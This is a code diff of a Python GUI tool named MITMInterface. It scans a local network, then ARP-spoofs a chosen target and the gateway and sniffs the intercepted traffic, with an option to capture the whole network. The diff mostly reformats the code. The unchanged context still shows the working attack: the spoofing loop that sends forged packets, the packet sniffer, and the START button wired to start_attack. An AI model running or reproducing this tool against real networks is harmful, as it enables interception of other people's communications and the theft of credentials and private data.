@@ -1,19 +1,21 @@
 # Copyright (c) Kernel-Tool
 # See the file 'LICENSE' for copying permission
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
+# ------------------------------------------------------------------------------------------------
 # EN:
-#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not touch or modify the code below. If there is an error, please contact the owner,
+#       but under no circumstances should you touch the code.
 #     - Do not resell this tool, do not credit it to yours.
 # FR:
-#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
+#       propriétaire, mais en aucun cas vous ne devez toucher au code.
 #     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
+# ------------------------------------------------------------------------------------------------
 
 import customtkinter as ctk
 import tkinter.messagebox
 import threading
 import time
 import socket
-import sys
 import os
 import re
 import queue
@@ -24,6 +26,7 @@ import concurrent.futures
 from datetime import datetime
 from scapy.all import get_if_hwaddr, get_if_addr, ARP, Ether, sendp, sniff, conf, srp
 import psutil
+
 try:
     import requests
 except ImportError:
@@ -37,16 +40,15 @@ TEXT_COLOR = '#25ffa8'
 FONT = ('Consolas', 15, 'bold')
 FONT_TITLE = ('Consolas', 23, 'bold')
 
+
 def get_available_interfaces():
     return [iface for iface in psutil.net_if_addrs().keys() if not iface.lower().startswith('loopback')]
 
+
 def get_default_interface():
-    try:
-        psutil.net_if_stats()
-    except Exception:
-        pass
     interfaces = get_available_interfaces()
     return interfaces[0] if interfaces else ''
+
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -59,8 +61,10 @@ def get_local_ip():
         s.close()
     return ip
 
+
 def guess_net(ip, prefix=24):
     return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))
+
 
 def arp_scan_scapy(cidr):
     try:
@@ -76,6 +80,7 @@ def arp_scan_scapy(cidr):
     except Exception as e:
         raise RuntimeError('Scapy ARP scan failed') from e
 
+
 def ping_once(ip):
     system = platform.system().lower()
     if system == 'windows':
@@ -84,11 +89,10 @@ def ping_once(ip):
         cmd = ['ping', '-c', '1', '-W', '1', ip]
     try:
         subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
-    except subprocess.CalledProcessError:
-        return False
+        return True
     except Exception:
         return False
-    return True
+
 
 def parse_arp_table():
     system = platform.system().lower()
@@ -97,9 +101,9 @@ def parse_arp_table():
         if system == 'windows':
             out = subprocess.check_output(['arp', '-a'], text=True, stderr=subprocess.DEVNULL)
             for line in out.splitlines():
-                m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+((?:[0-9a-f]{2}[-:]){5}[0-9a-f]{2})', line, re.I)
+                m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})', line, re.I)
                 if m:
-                    entries.append({'ip': m.group(1), 'mac': m.group(2).replace('-', ':')})
+                    entries.append({'ip': m.group(1), 'mac': m.group(2)})
         else:
             out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
             for line in out.splitlines():
@@ -109,6 +113,7 @@ def parse_arp_table():
     except Exception:
         pass
     return entries
+
 
 def sweep_network_ping(cidr, max_workers=200):
     try:
@@ -132,18 +137,18 @@ def sweep_network_ping(cidr, max_workers=200):
     except Exception:
         return []
 
+
 def reverse_dns(ip, timeout=1.5):
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
             fut = ex.submit(socket.gethostbyaddr, ip)
             try:
                 return fut.result(timeout=timeout)[0]
-            except concurrent.futures.TimeoutError:
-                return None
             except Exception:
                 return None
     except Exception:
         return None
+
 
 def netbios_name_lookup(ip):
     try:
@@ -181,6 +186,7 @@ def netbios_name_lookup(ip):
     except Exception:
         return None
 
+
 def get_vendor_from_mac_api(mac):
     try:
         if not mac or not requests:
@@ -193,6 +199,7 @@ def get_vendor_from_mac_api(mac):
         return None
     except Exception:
         return None
+
 
 def enrich_entry(entry):
     ip = entry.get('ip')
@@ -225,7 +232,7 @@ class MITMInterface(ctk.CTk):
             'gateway_mac': '',
             'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '',
             'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER'],
-            'sniff_all': False
+            'sniff_all': False,
         }
         self.local_mac = None
         self.local_ip = None
@@ -281,7 +288,7 @@ class MITMInterface(ctk.CTk):
             self.config['iface'] = self.iface_var.get()
             self.local_ip = get_if_addr(self.config['iface'])
             self.local_mac = get_if_hwaddr(self.config['iface'])
-            self.log(f"[AUTO] Interface used: {self.config['iface']}")
+            self.log(f'[AUTO] Interface used: {self.config["iface"]}')
             self.log(f'[AUTO] Local IP: {self.local_ip}')
             self.log(f'[AUTO] Local MAC: {self.local_mac}')
             gw_ip = self.detect_gateway()
@@ -331,7 +338,7 @@ class MITMInterface(ctk.CTk):
             enriched_sorted = sorted(enriched, key=lambda x: x.get('ip') or '')
             if enriched_sorted:
                 self.log('[AUTO] TARGET IPs and MACs:')
-                self.log(f"{'IP':16} {'MAC':18} {'Hostname':30} {'NetBIOS/mDNS':20} {'Vendor'}")
+                self.log(f'{"IP":16} {"MAC":18} {"Hostname":30} {"NetBIOS/mDNS":20} {"Vendor"}')
                 for e in enriched_sorted:
                     ip = e.get('ip') or '-'
                     mac = e.get('mac') or '-'
@@ -357,19 +364,16 @@ class MITMInterface(ctk.CTk):
         ctk.CTkLabel(left, text='OPERATIONAL LOGS', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
         self.log_text = ctk.CTkTextbox(left, fg_color='#000000', text_color=TEXT_COLOR, font=FONT, wrap='word')
         self.log_text.pack(fill='both', expand=True)
-
         center = ctk.CTkFrame(self, fg_color=BG_COLOR)
         center.grid(row=0, column=1, sticky='nsew', padx=6, pady=(6, 2))
         ctk.CTkLabel(center, text='CAPTURED PACKETS', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
         self.packet_tree = ctk.CTkTextbox(center, fg_color='#000000', text_color=TEXT_COLOR, font=FONT, wrap='none', height=33)
         self.packet_tree.pack(fill='both', expand=True)
-
         right = ctk.CTkFrame(self, fg_color=BG_COLOR)
         right.grid(row=0, column=2, sticky='nsew', padx=6, pady=(6, 2))
         ctk.CTkLabel(right, text='CONFIGURATION', font=FONT_TITLE, text_color=TEXT_COLOR).pack(pady=(11, 8))
         config_frame = ctk.CTkFrame(right, fg_color=BG_COLOR)
         config_frame.pack(fill='both', expand=True)
-
         labels = ['Target IP:', 'Gateway IP:', 'Target MAC:', 'Gateway MAC:', 'Protocols:']
         entries = []
         for label in labels:
@@ -380,31 +384,33 @@ class MITMInterface(ctk.CTk):
             entry.pack(side='left', padx=16)
             entries.append(entry)
         self.target_ip_entry, self.gateway_ip_entry, self.target_mac_entry, self.gateway_mac_entry, self.proto_entry = entries
-
         row_iface = ctk.CTkFrame(config_frame, fg_color=BG_COLOR)
         row_iface.pack(fill='x', pady=10)
         ctk.CTkLabel(row_iface, text='Interface:', font=FONT, text_color=TEXT_COLOR, width=170, anchor='w').pack(side='left')
         self.iface_var = ctk.StringVar(value=self.config['iface'])
-        self.iface_menu = ctk.CTkOptionMenu(row_iface, variable=self.iface_var, values=self.interfaces, font=FONT, width=260, fg_color='#000000', button_color='#000000', button_hover_color='#333333')
+        self.iface_menu = ctk.CTkOptionMenu(
+            row_iface, variable=self.iface_var, values=self.interfaces,
+            font=FONT, width=260, fg_color='#000000',
+            button_color='#000000', button_hover_color='#333333',
+        )
         self.iface_menu.pack(side='left', padx=16)
-
         self.sniff_all_var = ctk.BooleanVar(value=False)
-        self.sniff_all_check = ctk.CTkCheckBox(config_frame, text='Sniff entire network', variable=self.sniff_all_var, font=FONT, text_color=TEXT_COLOR, fg_color='#000000', hover_color='#333333')
+        self.sniff_all_check = ctk.CTkCheckBox(
+            config_frame, text='Sniff entire network', variable=self.sniff_all_var,
+            font=FONT, text_color=TEXT_COLOR, fg_color='#000000', hover_color='#333333',
+        )
         self.sniff_all_check.pack(pady=10)
         self.proto_entry.insert(0, 'HTTP,TCP,UDP,OTHER')
-
         bottom = ctk.CTkFrame(self, fg_color=BG_COLOR, height=80)
         bottom.grid(row=1, column=0, columnspan=3, sticky='ew', padx=6, pady=(3, 10))
         btn_frame = ctk.CTkFrame(bottom, fg_color=BG_COLOR)
         btn_frame.pack(expand=True)
-
         self.start_btn = ctk.CTkButton(btn_frame, text='START', command=self.start_attack, font=FONT, fg_color='#25ffa8', hover_color='#1dd88a', text_color='#FF0000', width=180, height=50)
         self.start_btn.pack(side='left', padx=18)
         self.stop_btn = ctk.CTkButton(btn_frame, text='STOP', command=self.stop_attack, state='disabled', font=FONT, fg_color='#25ffa8', hover_color='#ff6b81', text_color='#FF0000', text_color_disabled='#FF0000', width=180, height=50)
         self.stop_btn.pack(side='left', padx=18)
         ctk.CTkButton(btn_frame, text='SAVE', command=self.save_config, font=FONT, fg_color='#25ffa8', hover_color='#1db4fa', text_color='#FF0000', width=180, height=50).pack(side='left', padx=18)
         ctk.CTkButton(btn_frame, text='QUIT', command=self.quit, font=FONT, fg_color='#25ffa8', hover_color='#e07b00', text_color='#FF0000', width=180, height=50).pack(side='right', padx=18)
-
         self.status_var = ctk.StringVar(value='READY')
         ctk.CTkLabel(bottom, textvariable=self.status_var, text_color='#FF0000', font=FONT_TITLE, anchor='w').pack(side='left', padx=24)
 
@@ -413,19 +419,16 @@ class MITMInterface(ctk.CTk):
         self.log_queue.put(f'[{timestamp}] {msg}')
 
     def log_worker(self):
-        try:
-            while True:
-                try:
-                    msg = self.log_queue.get_nowait()
-                    self.log_text.insert('end', msg + '\n')
-                    self.log_text.see('end')
-                    lines = float(self.log_text.index('end-1c').split('.')[0])
-                    if lines > 200:
-                        self.log_text.delete('1.0', '50.0')
-                except queue.Empty:
-                    break
-        except Exception:
-            pass
+        while True:
+            try:
+                msg = self.log_queue.get_nowait()
+                self.log_text.insert('end', msg + '\n')
+                self.log_text.see('end')
+                lines = float(self.log_text.index('end-1c').split('.')[0])
+                if lines > 200:
+                    self.log_text.delete('1.0', '50.0')
+            except queue.Empty:
+                break
         self.after(150, self.log_worker)
 
     def save_config(self):
@@ -500,8 +503,8 @@ class MITMInterface(ctk.CTk):
             while not self.stop_event.is_set():
                 sendp(Ether() / target, iface=self.config['iface'], verbose=False)
                 sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
-                self.log(f'[SPOOF] Target IP: {self.config["target_ip"]}')
-                self.log(f'[SPOOF] Target MAC: {self.config["target_mac"]}')
+                self.log(f'[SPOOF] → Target IP: {self.config["target_ip"]}')
+                self.log(f'[SPOOF] → Target MAC: {self.config["target_mac"]}')
                 for _ in range(10):
                     if self.stop_event.is_set():
                         break
@@ -543,7 +546,7 @@ class MITMInterface(ctk.CTk):
                         'dst': dst,
                         'proto': proto_str,
                         'info': info[:30],
-                        'data': data[:40] if data else 'N/A'
+                        'data': data[:40] if data else 'N/A',
                     })
         try:
             sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
@@ -572,7 +575,10 @@ class MITMInterface(ctk.CTk):
 
 if __name__ == '__main__':
     def clear_screen():
-        os.system('clear' if os.name == 'posix' else 'cls')
+        if os.name == 'posix':
+            os.system('clear')
+        else:
+            os.system('cls')
     clear_screen()
     if platform.system() != 'Windows' and hasattr(os, 'geteuid') and os.geteuid() != 0:
         tkinter.messagebox.showerror('Permission', 'Run as root/admin for real capture')
